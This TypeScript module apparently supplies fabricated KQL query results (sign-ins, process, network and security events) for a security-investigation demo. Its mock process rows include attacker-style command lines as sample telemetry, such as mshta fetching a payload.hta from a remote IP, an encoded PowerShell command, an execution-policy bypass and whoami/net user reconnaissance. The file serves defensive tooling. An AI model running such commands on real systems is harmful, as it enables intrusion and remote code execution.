export type EntityType = 'user' | 'host' | 'ip' | 'process' | 'country' | 'event_id'

export interface ExtractedEntity {
  type: EntityType
  value: string
}

export interface MockQueryResult {
  columns: string[]
  rows: string[][]
  rowCount: number
  queryTimeMs: number
  sourceTable: string
  extractedEntities: ExtractedEntity[]
}

function ent(type: EntityType, value: string): ExtractedEntity {
  return { type, value }
}

// ── Entity filter extraction from KQL ────────────────────────────────────────

type FilterType = 'user_upn' | 'user_name' | 'host' | 'ip' | 'process'

interface EntityFilter {
  filterType: FilterType
  value: string
}

function extractEntityFilter(kql: string): EntityFilter | null {
  const checks: Array<[RegExp, FilterType]> = [
    [/UserPrincipalName\s*=~\s*"([^"]+)"/i,  'user_upn'],
    [/UserPrincipalName\s+has\s+"([^"]+)"/i, 'user_upn'],
    [/Account\s+has\s+"([^"]+)"/i,            'user_name'],
    [/AccountName\s+has\s+"([^"]+)"/i,        'user_name'],
    [/AccountName\s*=~\s*"([^"]+)"/i,         'user_name'],
    [/Computer\s*=~\s*"([^"]+)"/i,            'host'],
    [/DeviceName\s*=~\s*"([^"]+)"/i,          'host'],
    [/RemoteIP\s*==\s*"([^"]+)"/i,            'ip'],
    [/IPAddress\s*==\s*"([^"]+)"/i,           'ip'],
    [/FileName\s*=~\s*"([^"]+)"/i,            'process'],
  ]
  for (const [regex, filterType] of checks) {
    const m = kql.match(regex)
    if (m) return { filterType, value: m[1] }
  }
  return null
}

function matchesFilter(cellValue: string, filterValue: string): boolean {
  return cellValue.toLowerCase().includes(filterValue.toLowerCase())
}

// ── Row datasets ─────────────────────────────────────────────────────────────

const ALL_SIGNIN_ROWS: string[][] = [
  ['2026-05-10 08:23', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Microsoft 365'],
  ['2026-05-10 08:21', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Azure Portal'],
  ['2026-05-10 08:19', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50053', 'Microsoft 365'],
  ['2026-05-10 07:58', 'mwatson@corp.com',   '194.165.16.3',  'NG / Lagos',    '50074', 'SharePoint Online'],
  ['2026-05-10 05:30', 'svc-backup@corp.com','10.0.2.15',     'US / Virginia', '50126', 'Azure Backup'],
  ['2026-05-10 03:22', 'jdoe@corp.com',      '203.0.113.42',  'CN / Beijing',  '50126', 'Microsoft 365'],
]

const ALL_PROCESS_ROWS: string[][] = [
  ['2026-05-10 06:12', 'DESKTOP-42',  'jsmith',    'powershell.exe', '-EncodedCommand aQBmACAoAC...', 'a1b2c3d4e5f6...'],
  ['2026-05-10 05:45', 'DESKTOP-42',  'jsmith',    'cmd.exe',        '/c whoami && net user',          'e5f6a7b8c9d0...'],
  ['2026-05-10 04:31', 'SERVER-DC01', 'admin-svc', 'powershell.exe', '-ExecutionPolicy Bypass -File run.ps1', 'c9d0e1f2a3b4...'],
  ['2026-05-10 03:10', 'DESKTOP-A7B', 'tbrown',    'wscript.exe',    'C:\\Temp\\dropper.vbs',          'f3a4b5c6d7e8...'],
  ['2026-05-10 02:55', 'LAPTOP-F19',  'lgarcia',   'mshta.exe',      'http://185.220.101.5/payload.hta','d7e8f9a0b1c2...'],
]

const ALL_NETWORK_ROWS: string[][] = [
  ['2026-05-10 07:32', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '1,240,832', 'ConnectionSuccess'],
  ['2026-05-10 07:15', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '985,421',   'ConnectionSuccess'],
  ['2026-05-10 06:58', 'SERVER-DC01',   '185.220.101.5', '80',  'TCP', '2,108,000', 'ConnectionSuccess'],
  ['2026-05-10 05:44', 'WORKSTATION-07','8.8.8.8',       '53',  'UDP', '512',        'ConnectionSuccess'],
  ['2026-05-10 04:30', 'DESKTOP-42',    '203.0.113.42',  '4444','TCP', '88,000',    'ConnectionSuccess'],
]

const ALL_SECURITYEVENT_ROWS: string[][] = [
  ['2026-05-10 08:00', 'SERVER-DC01',    '4624', 'jsmith',     'Successful logon'],
  ['2026-05-10 07:45', 'DESKTOP-42',     '4688', 'jsmith',     'Process created: powershell.exe'],
  ['2026-05-10 07:30', 'WORKSTATION-07', '4625', 'admin',      'Failed logon — account locked'],
  ['2026-05-10 06:45', 'SERVER-DC01',    '4728', 'admin-svc',  'Member added to security group'],
  ['2026-05-10 05:55', 'DESKTOP-42',     '4720', 'svc-backup', 'User account created'],
]

// ── Entity extraction from filtered rows ──────────────────────────────────────

function signinEntities(rows: string[][]): ExtractedEntity[] {
  const users = [...new Set(rows.map(r => r[1]))].filter(Boolean)
  const ips   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
  const locs  = [...new Set(rows.map(r => r[3]))].filter(v => v && !v.includes('US'))
  return [
    ...users.map(v => ent('user', v)),
    ...ips.map(v => ent('ip', v)),
    ...locs.map(v => ent('country', v)),
  ]
}

function processEntities(rows: string[][]): ExtractedEntity[] {
  const hosts = [...new Set(rows.map(r => r[1]))].filter(Boolean)
  const users = [...new Set(rows.map(r => r[2]))].filter(Boolean)
  const procs = [...new Set(rows.map(r => r[3]))].filter(Boolean)
  const ips: string[] = []
  rows.forEach(r => {
    const ipM = r[4]?.match(/(\d{1,3}\.){3}\d{1,3}/)
    if (ipM) ips.push(ipM[0])
  })
  return [
    ...users.map(v => ent('user', v)),
    ...hosts.map(v => ent('host', v)),
    ...procs.map(v => ent('process', v)),
    ...[...new Set(ips)].map(v => ent('ip', v)),
  ]
}

function networkEntities(rows: string[][]): ExtractedEntity[] {
  const hosts = [...new Set(rows.map(r => r[1]))].filter(Boolean)
  const ips   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
  return [
    ...hosts.map(v => ent('host', v)),
    ...ips.map(v => ent('ip', v)),
  ]
}

function securityEventEntities(rows: string[][]): ExtractedEntity[] {
  const hosts  = [...new Set(rows.map(r => r[1]))].filter(Boolean)
  const eids   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
  const users  = [...new Set(rows.map(r => r[3]))].filter(Boolean)
  return [
    ...users.map(v => ent('user', v)),
    ...hosts.map(v => ent('host', v)),
    ...eids.map(v => ent('event_id', v)),
  ]
}

// ── Main export ───────────────────────────────────────────────────────────────

export function generateMockResults(kql: string): MockQueryResult {
  const lower = kql.toLowerCase()
  const filter = extractEntityFilter(kql)

  // ── IdentityInfo — user_inventory ────────────────────────────────────────
  if (lower.includes('identityinfo')) {
    return {
      columns: ['AccountUPN', 'AccountName', 'Department', 'JobTitle', 'AssignedRoles', 'RiskLevel', 'IsEnabled'],
      rows: [
        ['jsmith@corp.com',    'jsmith',    'Engineering', 'Senior Engineer',   'User,GlobalReader',    'Medium', 'true'],
        ['mwatson@corp.com',   'mwatson',   'Finance',     'Financial Analyst', 'User',                 'Low',    'true'],
        ['jdoe@corp.com',      'jdoe',      'Marketing',   'Campaign Manager',  'User',                 'Low',    'true'],
        ['tbrown@corp.com',    'tbrown',    'IT',          'Systems Admin',     'User,HelpDesk',        'Low',    'true'],
        ['lgarcia@corp.com',   'lgarcia',   'HR',          'HR Generalist',     'User',                 'Low',    'true'],
        ['admin-svc@corp.com', 'admin-svc', 'IT',          'Service Account',   'User,DeviceManagement','None',   'true'],
      ],
      rowCount: 6,
      queryTimeMs: 89,
      sourceTable: 'IdentityInfo',
      extractedEntities: [
        ent('user', 'jsmith@corp.com'),
        ent('user', 'mwatson@corp.com'),
        ent('user', 'jdoe@corp.com'),
        ent('user', 'tbrown@corp.com'),
        ent('user', 'lgarcia@corp.com'),
      ],
    }
  }

  // ── SigninLogs summarize — observed_users inventory ───────────────────────
  if (lower.includes('signinlogs') && lower.includes('summarize') && lower.includes('lastseen')) {
    return {
      columns: ['UserPrincipalName', 'LastSeen', 'SignInEvents', 'FailedSignIns', 'IPs', 'Locations'],
      rows: [
        ['jsmith@corp.com',  '2026-05-10 08:23', '47', '3', '["185.220.101.5","10.0.1.12"]',  '["RU/Moscow","US/Virginia"]'],
        ['mwatson@corp.com', '2026-05-10 07:58', '12', '1', '["194.165.16.3"]',               '["NG/Lagos"]'],
        ['jdoe@corp.com',    '2026-05-10 03:22', '8',  '0', '["203.0.113.42"]',               '["CN/Beijing"]'],
        ['lgarcia@corp.com', '2026-05-09 17:10', '31', '0', '["10.0.1.44"]',                  '["US/Virginia"]'],
        ['tbrown@corp.com',  '2026-05-09 15:42', '22', '0', '["10.0.1.55"]',                  '["US/Virginia"]'],
      ],
      rowCount: 5,
      queryTimeMs: 412,
      sourceTable: 'SigninLogs',
      extractedEntities: [
        ent('user', 'jsmith@corp.com'),
        ent('user', 'mwatson@corp.com'),
        ent('user', 'jdoe@corp.com'),
        ent('ip', '185.220.101.5'),
        ent('ip', '194.165.16.3'),
        ent('ip', '203.0.113.42'),
      ],
    }
  }

  // ── SigninLogs ────────────────────────────────────────────────────────────
  if (
    lower.includes('signinlogs') ||
    lower.includes('aadriskyusers') ||
    lower.includes('sign-in') ||
    lower.includes('signin')
  ) {
    let rows = ALL_SIGNIN_ROWS
    if (filter?.filterType === 'user_upn') {
      const filtered = rows.filter(r => matchesFilter(r[1], filter.value))
      if (filtered.length > 0) rows = filtered
    } else if (filter?.filterType === 'ip') {
      const filtered = rows.filter(r => matchesFilter(r[2], filter.value))
      if (filtered.length > 0) rows = filtered
    }
    return {
      columns: ['TimeGenerated', 'UserPrincipalName', 'IPAddress', 'Location', 'ResultType', 'AppDisplayName'],
      rows,
      rowCount: rows.length,
      queryTimeMs: 342,
      sourceTable: 'SigninLogs',
      extractedEntities: signinEntities(rows),
    }
  }

  // ── DeviceProcessEvents summarize — process_inventory ────────────────────
  if (lower.includes('deviceprocessevents') && lower.includes('summarize') && lower.includes('executions')) {
    return {
      columns: ['FileName', 'Executions', 'Hosts', 'Users', 'FirstSeen'],
      rows: [
        ['powershell.exe', '34', '["DESKTOP-42","SERVER-DC01","LAPTOP-F19"]', '["jsmith","admin-svc"]', '2026-05-09 01:12'],
        ['cmd.exe',        '28', '["DESKTOP-42","DESKTOP-A7B"]',              '["jsmith","tbrown"]',    '2026-05-09 02:30'],
        ['wscript.exe',    '7',  '["DESKTOP-A7B"]',                           '["tbrown"]',             '2026-05-10 03:10'],
        ['mshta.exe',      '3',  '["LAPTOP-F19"]',                            '["lgarcia"]',            '2026-05-10 02:55'],
        ['certutil.exe',   '2',  '["SERVER-DC01"]',                           '["admin-svc"]',          '2026-05-09 23:44'],
      ],
      rowCount: 5,
      queryTimeMs: 321,
      sourceTable: 'DeviceProcessEvents',
      extractedEntities: [
        ent('process', 'powershell.exe'),
        ent('process', 'cmd.exe'),
        ent('process', 'wscript.exe'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'SERVER-DC01'),
        ent('user', 'jsmith'),
        ent('user', 'admin-svc'),
      ],
    }
  }

  // ── DeviceProcessEvents / PowerShell ─────────────────────────────────────
  if (
    lower.includes('deviceprocessevents') ||
    lower.includes('deviceevents') ||
    lower.includes('processcreation') ||
    lower.includes('powershell') ||
    lower.includes('commandline') ||
    lower.includes('encoded') ||
    lower.includes('-enc')
  ) {
    let rows = ALL_PROCESS_ROWS
    if (filter?.filterType === 'user_name') {
      const filtered = rows.filter(r => matchesFilter(r[2], filter.value))
      if (filtered.length > 0) rows = filtered
    } else if (filter?.filterType === 'host') {
      const filtered = rows.filter(r => matchesFilter(r[1], filter.value))
      if (filtered.length > 0) rows = filtered
    } else if (filter?.filterType === 'process') {
      const filtered = rows.filter(r => matchesFilter(r[3], filter.value))
      if (filtered.length > 0) rows = filtered
    }
    return {
      columns: ['TimeGenerated', 'DeviceName', 'AccountName', 'FileName', 'ProcessCommandLine', 'SHA256'],
      rows,
      rowCount: rows.length,
      queryTimeMs: 287,
      sourceTable: 'DeviceProcessEvents',
      extractedEntities: processEntities(rows),
    }
  }

  // ── DeviceNetworkEvents summarize — ip_inventory ─────────────────────────
  if (lower.includes('devicenetworkevents') && lower.includes('summarize') && lower.includes('connections')) {
    return {
      columns: ['RemoteIP', 'Connections', 'Hosts', 'FirstSeen', 'LastSeen'],
      rows: [
        ['185.220.101.5', '47', '["SERVER-DC01","DESKTOP-42"]',     '2026-05-09 03:12', '2026-05-10 06:58'],
        ['203.0.113.42',  '23', '["DESKTOP-42","DESKTOP-A7B"]',     '2026-05-09 14:30', '2026-05-10 04:30'],
        ['31.13.72.36',   '18', '["DESKTOP-A7B"]',                  '2026-05-09 18:55', '2026-05-10 07:32'],
        ['8.8.8.8',       '12', '["WORKSTATION-07","DESKTOP-42"]',  '2026-05-09 06:00', '2026-05-10 05:44'],
        ['104.18.20.14',  '8',  '["LAPTOP-F19"]',                   '2026-05-09 22:10', '2026-05-10 01:30'],
      ],
      rowCount: 5,
      queryTimeMs: 278,
      sourceTable: 'DeviceNetworkEvents',
      extractedEntities: [
        ent('ip', '185.220.101.5'),
        ent('ip', '203.0.113.42'),
        ent('ip', '31.13.72.36'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'DESKTOP-A7B'),
      ],
    }
  }

  // ── DeviceNetworkEvents ───────────────────────────────────────────────────
  if (
    lower.includes('devicenetworkevents') ||
    lower.includes('networkcommunication') ||
    lower.includes('networkflow') ||
    lower.includes('outbound') ||
    lower.includes('connectionevents')
  ) {
    let rows = ALL_NETWORK_ROWS
    if (filter?.filterType === 'host') {
      const filtered = rows.filter(r => matchesFilter(r[1], filter.value))
      if (filtered.length > 0) rows = filtered
    } else if (filter?.filterType === 'ip') {
      const filtered = rows.filter(r => matchesFilter(r[2], filter.value))
      if (filtered.length > 0) rows = filtered
    }
    return {
      columns: ['TimeGenerated', 'DeviceName', 'RemoteIP', 'RemotePort', 'Protocol', 'BytesSent', 'ActionType'],
      rows,
      rowCount: rows.length,
      queryTimeMs: 198,
      sourceTable: 'DeviceNetworkEvents',
      extractedEntities: networkEntities(rows),
    }
  }

  // ── DeviceLogonEvents / IdentityLogonEvents / lateral movement ────────────
  if (
    lower.includes('devicelogonevents') ||
    lower.includes('identitylogonevents') ||
    lower.includes('identitylogon') ||
    lower.includes('lateralmovement') ||
    lower.includes('lateral') ||
    lower.includes('smb')
  ) {
    // When scoped to a user, show that user's logon history across devices
    if (filter?.filterType === 'user_name') {
      const u = filter.value
      const rows = [
        ['DESKTOP-42',  u, 'Interactive', '23', '2026-05-09 08:12', '2026-05-10 07:55'],
        ['SERVER-DC01', u, 'Network',     '8',  '2026-05-09 03:02', '2026-05-10 06:40'],
        ['FILE-SRV01',  u, 'Network',     '3',  '2026-05-09 22:14', '2026-05-10 01:15'],
      ]
      return {
        columns: ['DeviceName', 'AccountName', 'LogonType', 'LogonCount', 'FirstSeen', 'LastSeen'],
        rows,
        rowCount: rows.length,
        queryTimeMs: 221,
        sourceTable: 'DeviceLogonEvents',
        extractedEntities: [
          ent('user', u),
          ent('host', 'DESKTOP-42'),
          ent('host', 'SERVER-DC01'),
          ent('host', 'FILE-SRV01'),
        ],
      }
    }
    // Generic: device-centric view
    return {
      columns: ['TimeGenerated', 'AccountName', 'DeviceName', 'RemoteDeviceName', 'LogonType', 'Protocol'],
      rows: [
        ['2026-05-10 07:10', 'jsmith',    'DESKTOP-42',  'SERVER-DC01',    'Network', 'SMB'],
        ['2026-05-10 06:55', 'jsmith',    'DESKTOP-42',  'SERVER-FILES01', 'Network', 'SMB'],
        ['2026-05-10 06:40', 'admin-svc', 'SERVER-DC01', 'WORKSTATION-07', 'Network', 'WMI'],
        ['2026-05-10 06:22', 'admin-svc', 'SERVER-DC01', 'DESKTOP-A7B',    'Network', 'SMB'],
      ],
      rowCount: 4,
      queryTimeMs: 221,
      sourceTable: 'DeviceLogonEvents',
      extractedEntities: [
        ent('user', 'jsmith'),
        ent('user', 'admin-svc'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'SERVER-FILES01'),
        ent('host', 'WORKSTATION-07'),
        ent('host', 'DESKTOP-A7B'),
      ],
    }
  }

  // ── SecurityEvent summarize — host_inventory ──────────────────────────────
  if (lower.includes('securityevent') && lower.includes('summarize') && lower.includes('uniqueusers')) {
    return {
      columns: ['Computer', 'LastSeen', 'Events', 'UniqueUsers'],
      rows: [
        ['SERVER-DC01',    '2026-05-10 08:00', '312', '4'],
        ['DESKTOP-42',     '2026-05-10 07:45', '187', '2'],
        ['WORKSTATION-07', '2026-05-10 07:30', '94',  '3'],
        ['DESKTOP-A7B',    '2026-05-10 06:22', '76',  '2'],
        ['LAPTOP-F19',     '2026-05-09 17:10', '43',  '1'],
      ],
      rowCount: 5,
      queryTimeMs: 445,
      sourceTable: 'SecurityEvent',
      extractedEntities: [
        ent('host', 'SERVER-DC01'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'WORKSTATION-07'),
        ent('host', 'DESKTOP-A7B'),
        ent('host', 'LAPTOP-F19'),
      ],
    }
  }

  // ── SecurityEvent — admin creation / privileged changes ───────────────────
  if (
    lower.includes('4720') ||
    lower.includes('4728') ||
    lower.includes('local admin') ||
    lower.includes('user account created') ||
    lower.includes('privileged')
  ) {
    const rows = [
      ['2026-05-10 05:55', 'SERVER-DC01',   '4720', 'svc-backup2', 'admin-svc', 'CORP'],
      ['2026-05-10 04:10', 'WORKSTATION-07','4728', 'svc-backup2', 'admin-svc', 'CORP'],
      ['2026-05-09 23:44', 'SERVER-DC01',   '4720', 'temp-admin',  'SYSTEM',    'CORP'],
    ]
    let filteredRows = rows
    if (filter?.filterType === 'host') {
      const f = rows.filter(r => matchesFilter(r[1], filter.value))
      if (f.length > 0) filteredRows = f
    }
    return {
      columns: ['TimeGenerated', 'Computer', 'EventID', 'TargetUserName', 'SubjectUserName', 'SubjectDomainName'],
      rows: filteredRows,
      rowCount: filteredRows.length,
      queryTimeMs: 156,
      sourceTable: 'SecurityEvent',
      extractedEntities: [
        ent('user', 'svc-backup2'),
        ent('user', 'admin-svc'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'WORKSTATION-07'),
        ent('event_id', '4720'),
        ent('event_id', '4728'),
      ],
    }
  }

  // ── Generic fallback — SecurityEvent ─────────────────────────────────────
  let rows = ALL_SECURITYEVENT_ROWS
  if (filter?.filterType === 'user_name') {
    const filtered = rows.filter(r => matchesFilter(r[3], filter.value))
    if (filtered.length > 0) rows = filtered
  } else if (filter?.filterType === 'host') {
    const filtered = rows.filter(r => matchesFilter(r[1], filter.value))
    if (filtered.length > 0) rows = filtered
  }
  return {
    columns: ['TimeGenerated', 'Computer', 'EventID', 'AccountName', 'Activity'],
    rows,
    rowCount: rows.length,
    queryTimeMs: 312,
    sourceTable: 'SecurityEvent',
    extractedEntities: securityEventEntities(rows),
  }
}
